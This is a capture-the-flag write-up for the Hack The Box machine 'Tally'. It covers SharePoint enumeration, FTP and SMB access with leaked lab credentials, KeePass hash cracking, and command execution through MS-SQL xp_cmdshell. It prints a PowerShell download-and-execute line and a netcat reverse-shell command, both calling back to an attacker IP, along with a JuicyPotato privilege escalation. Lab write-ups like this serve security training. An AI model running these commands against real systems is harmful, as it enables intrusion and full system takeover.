# Tally [HTB](https://app.hackthebox.com/machines/113)
![tally-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/tally-01.png)


## Recon

After adding the target to my `/etc/hosts` file I start scanning for open ports:

```bash
nmap -p- --min-rate 10000 tally.htb
```

![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/ports-02.png)


`nmap` shows 21 ports open, though many of them seem to be RPC related. Let's run a version detection scan againts the more relevant ports:

```bash
nmap -p 21,80,81,135,139,445,808,1433,5985,15567,47001 -sCV tally.htb -oN nmap.result
```

![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/nmap-res-03.png)
![nmap-res-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/nmap-res-04.png)
![nmap-res-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/nmap-res-05.png)

We have the following:

+ An FTP server on port 21.
+ An IIS/10.0 on ports 80 & 15567.
+ An HTTPAPI service on ports 81, & 47001.
+ An RPC endpoint-mapper on port 135.
+ NetBIOS on port 139.
+ An SMB server on port 445.
+ A "ccproxy-http" service on port 808.
+ An SQL/13.00.1601 server on port 1433. 
+ WinRM service on port 5985. 


Looking through the list, the most interesting things to check in my opinion are the IIS, SMB and SQL serers. The FTP is also worth checking, though I didn't notice `nmap` mananged to connect to it anonymously.


There is also the `ccproxy-http` service. I found this [check-point page](https://advisories.checkpoint.com/defense/advisories/public/2009/cpai-2008-346.html/) that describes this to be an internet connection sharing software and web proxy software. I also looked up exploits for this tech and I found this [buffer overflow attack](https://www.exploit-db.com/exploits/621) on ExploitDB from 2004...


I tried to conenct to this port via `nc` and `telnet`, the connection was accepted, but nothing happened and the server terminated the connection. So I don't think it's the way forward. Later on I came to find that ports 808, 32843, 32844 and 32864 are all related to SharePoint. [source](https://blogit.create.pt/fabiocarvalho/2017/02/14/sharepoint-2016-tcpip-ports/).


Let's start with the SMB server on port 445.


## SMB Port 445


First, I try to list the content's of the SMB server using a null session, but I was denied access:

```bash
smbclient -N -L \\\\tally.htb\\
```

![smb-denied-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/smb-denied-06.png)


But running `crackmapexec` does at least identify the target OS to be an x64-bit 2016 Windows server:

```bash
crackmapexec smb tally.htb
```

![crackmap-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/crackmap-07.png)


Let's check the IIS server.


### SharePoint Ports 80, 15567


If we browse towards `http://tally.htb` we see a Microsoft SharePoint portal:

![sp-website-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/sp-exploit-08.png)


There is a single link here of `Sign In` which opens a basic HTTP authentication scheme, but we don't have credentials. 


If we open the site at `http://tally.htb:15567` we also get prompted for credentials which we dont' have:

![second-website-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/second-website-09.png)


So not much we can do. Running a directory scans againts these two sites revealed nothing meaningful. 


At this point I got a bit stuck, so I started searching onlin how to pentest SharePoint sites and I found [this artical](https://resources.bishopfox.com/resources/tools/sharepoint-hacking-diggity/attack-tools/) which offered using a tool they created called `SharePointURLBrute`.


This tool is a perl script, desgined to quickly identify misconfigured SharePoint URLs that permit unauthenticated users to reach administrative pages. A download link for the script is provided in the artical. 

I decided to give it a try. 


After downloading and extracting the archive into a dedicated directory we get the following:

![archive-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/archive-10.png)


There are two executable files, one text file which has the list of URL's to brute force and also a PDF file. We only really need the perl script and the text file. 


To run the program, we need to supply a target URL to the `-a` switch, and we need to supply a URL list to the `-e` switch. So we can run something like this:

```bash
perl SharePointURLBrute\ v1.1.pl -a "http://tally.htb/" -e SharePoint-UrlExtensions-18Mar2012.txt
```

![share-brute-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/share-brute-11.png)


Looks like we got some results. 


I visted every single URL here, only the last one had something useful:

![allitems-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/allitems-12.png)


This file is publicly available for any unauthinticated user to download. 


The file is a Microsoft Word document, but we can convert it to a normal text file using `docx2text` as such: 

```bash
docx2txt ftp-details.docx ftp-details.txt
```

Now we can read the file as we noramlly would on a Linux system:

![ftp-detail-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/ftp-detail-13.png)


We get a password for the FTP server but there is not username. I tried to open the Word document on a Windows system to go over the metadata but there was nothing useful there. 


At this point I got stuck again, I wasn't sure what I was missing. Eventually I went back to the previously linked artical to see if I could find more info. I saw that they linked a PDF along with the exploit as well, so I decided to read it:


![pdf-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/pdf-14.png)


This PDF had additional URL's we can check, so I decided to try them out manually. If we open the URL I highlighted we will get the following:

![viewlists-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/viewlists-15.png)


There are four folders here.


The `Documents` folder leads to `/Shared Documents/Forms/AllItems.aspx` which is the page where we found the FTP file. There is also the `Site Pages` folder which has an item in it as well. 


But if we click on this folder we get nothing:

![nothing-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/nothing-16.png)


I wasn't sure what I was doing wrong... 


Eventually I figured out that in the FTP file, it said that the hostname is `tally`. So I added this name to my `/etc/hosts` file as well:

![hosts-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/hosts-17.png)



Now if we open the same link only with `tally` instead of `tally.htb` we get the item:

![item-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/item-18.png)


If we click on this file we will see the following:

![file-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/file-19.png)


We got three possible usernames from this message: `Sarah`, `Tim` & `Rahul`. But the message also mentioned an `ftp_user` account. 


If we use this as the username we can login to the FTP server:

![ftp-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/ftp-20.png)


## FTP Port 21


Now that we have access to the server, we can download all the files from it using this one liner:

```bash
wget -m ftp://ftp_user:'UTDRSCH53c"$6hys'@tally.htb
```


After the download completes, we will get a `tally.htb` directory that has everything. Let's go over the files:

+ From-Custodian

This folder has a few dozen files ending with a `.log` extension, all read somewhat the same, and were of no real use. 


I deleted this directory and it's contents. 


+ Intranet

This folder has a `Binaries` folder which in turn, has as a `'Firefox Setup 44.0.2.exe'` executable inside. I searched online for this executable and I found this [RCE exploit](https://www.exploit-db.com/exploits/44294) from ExploitDB. 


To pull this off, we need to modify the payload to get a reverse shell, and then host it via a web server. Then, from inside target, someone needs to browse over to this malicious file to trigger the exploit. 


I wasn't sure how wer'e suposed to trigger the exploit without access to the system. After completing this box I read the writeup from `0xdf`, which correctly identified a lead in the SharePoint message that hinted that there was an automated script that checks for this. But I missed this hint :) 


+ Logs

This folder has a bunch of text files that read as such: `connection from 127.0.0.1`, that's it.


I deleted this directory. 


+ To-Upload 

This folder has a `employees-id_number.xlsx` file which has a list of 179 employee's first and last names. Not super useful. 


There was also an `Invoice` folder which has a `Invopices.zip` archive with a bunch of `csv` files that are all the same and are not useful either. 


I deleted this directory as well. 


+ User

This folder is where each user saves they're files. I will only note the more relevant results here. 

+ Sarah

In `Sarah`'s folder we can three files:

![sarah-files-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/sarah-files-21.png)


I searched online for the `.msi` and `.exe` files, but I didn't find anything useful. The `notes.txt` file mainly says that `Sarah` needs to delete the MS-SQL server. 


+ Tim

This was the most useful folder by far. Inside of Tim's folder there are two main folders: Files & Project. 

1) `Project` has a single file that reads as such:

![tim-file-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/tim-file-22.png)


There is a mention of an encrypted share and credentials inside a keepass database. 


2) The `Files` folder has the following contents:

![files-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/files-23.png)


The `KeePass-2.36` folder has what seems like a portable version of KeePass. The `bonus.txt` isn't useful. 


Then, there is the KeePass database. Let's try to crack it! 


We can do this with john the ripper as such:

```bash
keepass2john tim.kdbx > tim.hash
john tim.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![cracked-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/cracked-24.png)


The password for the KeePass database is `simplementeyo`. I have KeePass installed on a Windows VM so I open the database there.


There are thee main user accounts in the databae: 

1) TALLY ACCT share `Finance : Acc0unting` 

2) Default `cisco : cisco123`

3) PDF Writer `64257-56525-54257-54734 : None`



The first user account is the most intersting. Could it be for the SMB share?


Let's try to connect:

```bash
smbclient -U htb.local/Finance%Acc0unting \\\\tally.htb\\ACCT
```

![smb-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/smb-25.png)


We are in! 


### ACCT Share 


This SMB server is loaded with data. There are lots of subdirectories inside subdirectories, and different files ranging from executables to PDFs. Most of it is completely irrelevant, so I will only show two files that were interesting. 


+ `\zz_Archived\SQL\conn-info.txt`.


This file has a password for a database but it says it's an old password:

![conn-info-26](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/conn-fin-26.png)


+ `\zz_Migration\Binaries\New folder\tester.exe`


This is the only custom application in the `Binaries` directory. If we run `strings` on it we see the following:

![string-27](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/strings-27.png)


These looks like the right credentials for the MS-SQL server. Let's try to connect:

```bash
impacket-mssqlclient sa:GWE3V65#6KFH93@4GWTG2G@tally.htb
```

![mssql-28](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/mssql-28.png)


## MS-SQL 


To get a shell from the MS-SQL connection, our user has to have `sysadmin` roles. We can check that using:

```mssql
SELECT IS_SRVROLEMEMBER('sysadmin');
```

![sysamdin-29](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/sysadmin-29.png)


We do have the `sysadmin` role. 


Now we need to enable `xp_cmdshell` with the following commands:

```mssql
# This turns on advanced options and is needed to configure xp_cmdshell
sp_configure 'show advanced options', '1'
RECONFIGURE
#This enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE
```

![enable-30](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/enable-30.png)


Let's run a quick test to see if we can run OS commands:

```mssql
EXEC master..xp_cmdshell 'whoami'
```

![exec-31](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/exec-31.png)


Looks like we can! 


From here we can use a common setup to get a shell using [nishang](https://github.com/samratashok/nishang)'s `Invoke-PowerShellTcp.ps1` script. 


After downloading the script make sure to invoke it at the end accordingly:

![invoke-32](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/invoke-32.png)


Then host this file using a python web server:

```bash
python3 -m http.server 80
```

Start the local listner:

```bash
rlwrap nc -lnvp 443
```

And finally, we can download and execute the script from the MS-SQL shell using:

```mssql
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.54/Invoke-PowerShellTcp.ps1") | powershell -noprofile'
```

And we get a shell as `Sarah`:

![shell-33](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/shell-33.png)


The first command throws an exception, but afterwards everything works fine. 


## Privilege Escalation


After landing on the machine, I start looking for easy wins, like any privileges we may have:

![priv-33](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/priv-33.png)


We can see `Sarah` has the Impersonate privilge enabled, we can exploit this to get a SYSTEM shell using something like [JuicyPotato](https://github.com/ohpe/juicy-potato).


To pull this off we need to transfer a copy of both `JuicyPotato` and `nc64.exe` over to the target. I grab a copy of both files to my working directory and start a python server using:

```bash
python3 -m http.server 80 
```

Then, I downloadd both files from the target using:

```cmd
certutil -urlcache -f http://10.10.14.54/JuicyPotato.exe jp.exe
certutil -urlcache -f http://10.10.14.54/nc64.exe nc.exe
```

Now we need to find a working CLSID for the target's OS version which is a 2016 Windows server. We can find an extensive list of CLSID's [here](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2016_Standard).

![clsid-34](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/clsid-34.png)


Next we start the local listener:

```bash
rlwrap -cAr nc -lvnp 9001 
```


Now we should be ready to execute the exploit, which we can do with the below command:

```cmd
C:\Users\Sarah\Desktop\jp.exe -l 9001 -p C:\windows\system32\cmd.exe -a "/c C:\Users\Sarah\Desktop\nc.exe -e cmd.exe 10.10.14.54 9001" -t * "{e60687f7-01a1-40aa-86ac-db1cbf673334}"
```

This stalls my shell which is a good sign. And on my netcat listener I receive the connection:

![root-35](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tally/img/root-35.png)
